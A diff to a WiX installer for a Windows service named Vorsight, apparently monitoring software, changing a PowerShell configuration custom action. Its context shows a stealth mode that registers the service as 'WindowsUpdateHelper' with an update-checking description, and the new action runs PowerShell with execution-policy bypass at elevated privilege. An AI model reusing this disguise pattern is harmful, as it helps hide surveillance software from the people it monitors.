@@ -37,12 +37,21 @@
     <SetProperty Id="SERVICE_DESCRIPTION" Value="Provides background update checking and system health monitoring." Before="CostFinalize" Sequence="first" Condition="USE_STEALTH_MODE" />
     <SetProperty Id="AGENT_REGISTRY_NAME" Value="WindowsUpdateHelper" Before="CostFinalize" Sequence="first" Condition="USE_STEALTH_MODE" />
     
-    <!-- UI Configuration -->
+    <!-- Use blank license file -->
+    <WixVariable Id="WixUILicenseRtf" Value="License.rtf" />
+    
+    <!-- UI Configuration - InstallDir with custom dialogs -->
     <ui:WixUI Id="WixUI_InstallDir" InstallDirectory="INSTALLFOLDER" />
     
-    <!-- Insert custom dialogs into install flow -->
+
+    <!-- Referenced custom dialogs -->
     <UI>
-      <Publish Dialog="InstallDirDlg" Control="Next" Event="NewDialog" Value="ConfigDialog" Order="3" Condition="1" />
+      <DialogRef Id="ConfigDialog" />
+      <DialogRef Id="InstallDirDlg" />
+      <DialogRef Id="VerifyReadyDlg" />
+      
+      <!-- Override InstallDirDlg's Next button to go to ConfigDialog -->
+      <Publish Dialog="InstallDirDlg" Control="Next" Event="NewDialog" Value="ConfigDialog" Order="3" />
     </UI>
   </Package>
 
@@ -50,7 +59,8 @@
     <ComponentGroup Id="ServiceComponents" Directory="INSTALLFOLDER">
       <Component Id="VorsightServiceComponent" Guid="*" Bitness="always64">
         <File Id="VorsightServiceExe" Source="..\Vorsight.Service\bin\Release\net10.0\win-x64\publish\Vorsight.Service.exe" Name="[SERVICE_EXE_NAME]" KeyPath="yes" />
-        <File Id="ConfigureWebAuthScript" Source="ConfigureWebAuth.ps1" />
+        <File Id="ConfigureClientScript" Source="ConfigureClient.ps1" />
+        <File Id="ConfigureClientWrapperScript" Source="ConfigureClientWrapper.ps1" />
         <ServiceInstall Id="ServiceInstaller"
                         Type="ownProcess"
                         Name="[SERVICE_NAME]"
@@ -86,12 +96,15 @@
       <RegistryValue Root="HKCU" Key="Software\Vorsight" Name="DriveCredentialsInstalled" Type="integer" Value="1" KeyPath="yes" />
     </Component>
     
-    <!-- PowerShell web authentication setup -->
-    <CustomAction Id="ConfigureWebAuth" 
+    <!-- Set CustomActionData for deferred client configuration -->
+    <SetProperty Id="ConfigureClient" Value="INSTALLDIR=[INSTALLFOLDER];SERVER_HOST=[SERVER_HOST];SERVER_PORT=[SERVER_PORT];JWT_SECRET=[PRESHARED_KEY]" Before="ConfigureClient" Sequence="execute" />
+    
+    <!-- Client configuration - updates appsettings.json with server connection info -->
+    <CustomAction Id="ConfigureClient" 
                   Directory="INSTALLFOLDER"
-                  ExeCommand='powershell.exe -ExecutionPolicy Bypass -File ConfigureWebAuth.ps1 -InstallDir "[INSTALLFOLDER]"'
+                  ExeCommand='powershell.exe -ExecutionPolicy Bypass -File ConfigureClientWrapper.ps1'
                   Execute="deferred"
-                  Impersonate="yes"
+                  Impersonate="no"
                   Return="check" />
     
     <!-- PowerShell OAuth configuration - passes OAUTH_JSON directly to script -->
@@ -103,8 +116,8 @@
                   Return="ignore" />
     
     <InstallExecuteSequence>
-      <Custom Action="ConfigureWebAuth" After="InstallFiles" Condition="NOT Installed" />
-      <Custom Action="ConfigureGoogleDrive" After="ConfigureWebAuth" Condition="NOT Installed AND OAUTH_JSON" />
+      <Custom Action="ConfigureClient" After="InstallFiles" Condition="NOT Installed" />
+      <Custom Action="ConfigureGoogleDrive" After="ConfigureClient" Condition="NOT Installed AND OAUTH_JSON" />
     </InstallExecuteSequence>
   </Fragment>
 
